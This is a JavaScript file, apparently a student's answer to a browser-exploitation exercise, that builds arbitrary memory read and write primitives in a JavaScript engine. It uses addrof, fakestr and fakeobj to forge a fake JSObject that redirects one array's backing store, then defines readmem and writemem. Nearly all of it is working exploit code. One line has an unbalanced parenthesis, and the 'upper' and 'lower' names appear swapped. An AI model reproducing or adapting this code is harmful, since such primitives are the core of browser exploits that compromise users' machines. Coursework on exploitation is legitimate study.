/*
 * TODO: Part B solution goes here!
 */


let dataPlane = [1];
let arrToCopy = [1]; //real array that we'd like control plane to emulate
let headerStr = "\x02\x00\x00\x00\x00\x0d\x02\x00"; //first 8 bytes of typed array header
let str1Addr = addrof(arrToCopy) - (1.6e-322); //0x20
let str1 = fakestr(str1Addr);
let off = 0x0;
while (str1.substring(off, off + 0x8) !== headerStr) {
	off += 0x8;
}
let str2 = str1.substring(off, off + 0x38); //first 56 bytes of arrToCopy's JSObject
let dataPlaneAddr = "00000000" + addrof(dataPlane).toString(16)); //8 byte address of dataPlane
dataPlaneAddr = dataPlaneAddr.substring(dataPlaneAddr.length - 16);
for (let i = 7; i >= 0; i--) {
	str2 += String.fromCharCode(strToHex(dataPlaneAddr.substring(i * 2, i * 2 + 2))); //Add the 8 bytes of address to finish the fake JSObject
}
let controlPlane = fakeobj(str2); //finished controlPlane object


function strToHex(str) {
	return Number("0x" + str);
}

function readmem(addr) {
	let addrStr = "00000000" + addr.toString(16);
	addrStr = addrStr.substring(addrStr.length - 16);
	let upper = strToHex(addrStr.substring(8, 16));
	let lower = strToHex(addrStr.substring(0, 8));
	controlPlane[14] = upper;
	controlPlane[15] = lower;
	return dataPlane[0];
}

function writemem(addr, val) {
	let addrStr = "00000000" + addr.toString(16);
	addrStr = addrStr.substring(addrStr.length - 16);
	let upper = strToHex(addrStr.substring(8, 16));
	let lower = strToHex(addrStr.substring(0, 8));
	controlPlane[14] = upper;
	controlPlane[15] = lower;
	dataPlane[0] = val;
}
